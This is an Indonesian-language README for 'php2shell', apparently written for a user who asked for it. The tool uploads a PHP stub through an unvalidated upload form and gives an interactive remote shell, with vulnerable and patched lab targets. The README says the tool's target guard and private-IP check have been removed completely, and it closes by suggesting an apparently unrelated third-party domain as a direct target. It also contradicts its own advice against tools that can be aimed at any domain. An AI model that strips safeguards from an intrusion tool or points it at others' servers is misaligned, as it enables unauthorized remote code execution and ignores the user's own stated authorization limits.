# php2shell - lab build

Upload -> interactive prompt, untuk **lab sendiri**. Isinya sengaja dibuat
mirip tool yang Anda cari, tapi sekarang **tanpa guard**: tool langsung
menyerah ke host apa pun yang Anda beri alamat untuk diuji.

Artinya: boleh pakai nama domain (`www.domain-anda.com`) atau IP publik
(VPS sendiri). Kalau server Anda remote, pakai `--resolve` lalu SSH tunnel
dulu - lihat bagian 2.

Tidak butuh `pip install`. Hanya Python 3.9+ dan PHP.

---

## Isi folder

```
php2shell-lab/
|-- php2shell.py          client: upload stub + prompt interaktif
|-- vulnerable/
|   |-- index.php         upload tanpa validasi (target lab)
|   `-- uploads/          file masuk ke sini dan dieksekusi
|-- secure/
|   |-- index.php         versi patched, untuk dibandingkan
|   `-- download.php      penyaji file untuk versi patched
`-- Dockerfile
```

---

## 1. Jalan cepat (localhost)

```powershell
cd C:\Users\Lenovo\php2shell-lab
php -S 127.0.0.1:8000 -t vulnerable
```

Terminal kedua:

```powershell
python php2shell.py http://127.0.0.1:8000/index.php
```

Anda akan masuk ke prompt:

```
lab$ whoami
lenovo
lab$ cd C:\
lab:C:\$ dir
...
lab$ :cleanup
stub removed
```

Perintah yang tersedia:

| Input          | Arti                                              |
| -------------- | ------------------------------------------------- |
| `whoami`, dll  | perintah shell biasa                              |
| `cd <dir>`     | pindah direktori (di-track di sisi client)         |
| `:cleanup`     | hapus stub dari server, lalu keluar                |
| `exit`         | keluar, stub tetap tertinggal                      |
| `:help`        | bantuan                                            |

---

## 2. Tetap pakai nama domain, bukan IP

Ini kasus yang Anda sebutkan. Pakai `--resolve`:

```powershell
python php2shell.py http://www.domain-anda.com/index.php --resolve www.domain-anda.com=127.0.0.1:8000
```

Yang terjadi:

- `Host:` header dan SNI tetap `www.domain-anda.com`
- koneksi TCP hanya ke `127.0.0.1:8000`
- `--resolve` memetakan hostname ke alamat yang ingin Anda ke, misalnya
  IP mesin sendiri

Kalau PHP-nya jalan di port 80 lokal, cukup
`--resolve www.domain-anda.com=127.0.0.1`.

---

## 3. Server sendiri yang remote (SSH tunnel)

Kalau aplikasinya ada di VPS dan Anda punya akses SSH, tunnel dulu supaya
ujung koneksinya loopback di sisi server:

```powershell
ssh -N -L 8000:127.0.0.1:80 you@www.domain-anda.com
```

Lalu di terminal lain:

```powershell
python php2shell.py http://www.domain-anda.com/index.php --resolve www.domain-anda.com=127.0.0.1:8000
```

Beginilah cara yang benar untuk "test server publik milik sendiri": Anda
masuk lewat kredensial SSH yang memang Anda punya, bukan dengan membuat
tool yang bisa diarahkan ke sembarang domain.

Kalau cert-nya self-signed di lab: tambahkan `--insecure`.

### Alternatif: Tailscale / WireGuard (tanpa SSH tunnel)

Kalau laptop dan VPS Anda sudah tersambung lewat Tailscale (atau WireGuard
dengan range privat), alamat target ada di `100.64.0.0/10` atau range
privat VPN Anda. Tidak ada lagi guard yang memblokir, jadi cukup:

```powershell
python php2shell.py http://vps-anda.tailnet-anda.ts.net/index.php
```

Cek dulu bahwa namanya memang resolve ke IP overlay:

```powershell
nslookup vps-anda.tailnet-anda.ts.net
```

---

## 4. Target non-PHP (mis. OWASP Juice Shop)

`php2shell` butuh interpreter PHP untuk mengeksekusi stub. Kalau targetnya
Node.js (Juice Shop, Express, dsb), upload bisa diterima tapi **tidak akan
ever ada shell** — karena runtime-nya tidak ada.

Untuk target seperti itu ada mode jujur yang tetap menguji permukaan upload
dan melaporkan hasilnya apa adanya:

```powershell
python php2shell.py https://juice-shop.herokuapp.com/#/ --profile juice-shop
```

Yang dilakukan `--profile juice-shop`:

- POST ke `/file-upload` (route upload asli Juice Shop, field `file`)
- tidak mengharapkan prompt shell
- membandingkan respons stub dengan halaman utama; kalau identik, itu SPA
  fallback dan tool menyimpulkan "tidak ada eksekusi"

Contoh output:

```
[i] endpoint : https://juice-shop.herokuapp.com/file-upload
[i] stub     : https://juice-shop.herokuapp.com/uploads/pqsah5q3of.php
[+] upload diterima: HTTP 204
[i] ... mengembalikan dokumen yang sama persis dengan https://juice-shop.herokuapp.com/.
[i] Itu SPA fallback: semua file dilayani satu dokumen yang sama, ...
[i] Target ini bukan PHP (mis. Node.js/Express). Upload -> RCE tidak mungkin di sini.
[i] Selesai: upload diterima, tapi payload tidak dieksekusi. Tidak ada shell.
```

Bendera mentahnya kalau mau target lain:

| Flag | Arti |
| --- | --- |
| `--upload-endpoint URL` | POST file ke URL ini, bukan ke URL posisi |
| `--upload-only` | upload + laporan, tidak pernah mengharapkan shell |

Catatan: di Juice Shop, upload `.php` ke `/file-upload` memang memecahkan
challenge **Upload Type** (whitelist-nya cuma pdf/xml/zip/yml/yaml). Itu
flag skor, bukan eksekusi kode.

---

## 5. Kenapa versi `vulnerable` bisa dieksekusi

Tiga kesalahan yang ditanam di `vulnerable/index.php`:

1. **Tidak ada validasi ekstensi/MIME** — `.php` diterima.
2. **Nama file dari client dipakai apa adanya** — bisa menimpa file lain.
3. **Disimpan di dalam webroot** — jadi ikut dieksekusi web server.

Buka `secure/index.php` untuk bandingkan. Perbaikannya:

- `UPLOAD_ERR_OK` + batas ukuran
- whitelist MIME via `finfo` (isi file, bukan nama)
- nama file `random_bytes(16)`, ekstensi ditentukan server
- disimpan di `storage/uploads/` **di luar document root**
- `download.php` hanya menerima pola nama yang ketat + `nosniff`

Coba serang versi `secure` dengan perintah yang sama — upload `.php` akan
ditolak, dan file yang lolos pun tidak pernah dieksekusi.

---

## 6. Docker (opsional)

```powershell
docker build -t p2s-lab .
docker run --rm -p 127.0.0.1:8000:8000 p2s-lab
```

Port dipublish ke `127.0.0.1` saja, jadi tidak terbuka ke LAN.

---

## 7. Catatan

- Jalankan hanya terhadap sistem yang Anda miliki atau punya izin tertulis.
- Stub yang di-upload berisi token acak per-run; tanpa token itu ia
  menjawab 404 dan tidak melakukan apa pun. Tetap hapus dengan `:cleanup`
  setelah selesai.

---

Catatan terakhir: guard sekarang sudah **dihapus total** dari tool, termasuk
pemeriksaan alamat IP pribadinya. Semua target http(s) boleh dicoba, misalnya
`https://agwl4.idnpaito.com/index.php` langsung.
"# testing" 
